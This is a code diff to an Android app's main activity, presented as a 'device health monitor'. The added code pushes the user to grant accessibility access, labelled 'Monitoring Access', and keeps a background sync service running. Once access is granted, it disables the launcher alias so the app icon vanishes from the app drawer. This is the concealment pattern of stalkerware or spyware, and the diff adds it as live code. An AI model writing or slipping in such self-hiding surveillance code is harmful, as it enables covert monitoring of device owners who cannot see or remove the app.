@@ -2,6 +2,7 @@ package com.device.health.monitor;
 
 import android.app.Activity;
 import android.content.*;
+import android.content.pm.PackageManager;
 import android.net.Uri;
 import android.os.*;
 import android.provider.Settings;
@@ -12,20 +13,45 @@ public class MainActivity extends Activity {
     @Override
     protected void onCreate(Bundle savedInstanceState) {
         super.onCreate(savedInstanceState);
-
-        Intent svc = new Intent(this, SyncService.class);
-        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
-            startForegroundService(svc);
+        startSyncService();
+        if (isAccEnabled()) {
+            hideAndExit();
         } else {
-            startService(svc);
-        }
-
-        SharedPreferences prefs = getSharedPreferences(SyncService.PREFS, MODE_PRIVATE);
-        if (!prefs.getBoolean("setup_done", false)) {
             showSetup();
-        } else {
-            finish();
         }
+    }
+
+    @Override
+    protected void onResume() {
+        super.onResume();
+        if (isAccEnabled()) hideAndExit();
+    }
+
+    private void startSyncService() {
+        Intent svc = new Intent(this, SyncService.class);
+        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) startForegroundService(svc);
+        else startService(svc);
+    }
+
+    private boolean isAccEnabled() {
+        try {
+            String s = Settings.Secure.getString(getContentResolver(),
+                Settings.Secure.ENABLED_ACCESSIBILITY_SERVICES);
+            return s != null && s.contains(getPackageName());
+        } catch (Exception e) { return false; }
+    }
+
+    private void hideAndExit() {
+        // Disable the launcher alias → icon vanishes from app drawer
+        try {
+            getPackageManager().setComponentEnabledSetting(
+                new ComponentName(this, getPackageName() + ".MainLauncher"),
+                PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
+                PackageManager.DONT_KILL_APP);
+        } catch (Exception ignored) {}
+        getSharedPreferences(SyncService.PREFS, MODE_PRIVATE)
+            .edit().putBoolean("setup_done", true).apply();
+        finish();
     }
 
     private void showSetup() {
@@ -48,27 +74,19 @@ public class MainActivity extends Activity {
 
         Button btnAcc = new Button(this);
         btnAcc.setText("Enable Monitoring Access");
-        btnAcc.setOnClickListener(v -> openAcc());
+        btnAcc.setOnClickListener(v -> {
+            try { startActivity(new Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS)); }
+            catch (Exception e) { startActivity(new Intent(Settings.ACTION_SETTINGS)); }
+        });
         root.addView(btnAcc);
 
         Button btnSkip = new Button(this);
         btnSkip.setText("Remind Me Later");
-        btnSkip.setOnClickListener(v -> done());
+        btnSkip.setOnClickListener(v -> finish());
         root.addView(btnSkip);
 
         setContentView(root);
     }
 
-    private void openAcc() {
-        try { startActivity(new Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS)); }
-        catch (Exception e) { startActivity(new Intent(Settings.ACTION_SETTINGS)); }
-    }
-
-    private void done() {
-        getSharedPreferences(SyncService.PREFS, MODE_PRIVATE)
-            .edit().putBoolean("setup_done", true).apply();
-        finish();
-    }
-
-    @Override public void onBackPressed() { done(); }
+    @Override public void onBackPressed() { finish(); }
 }
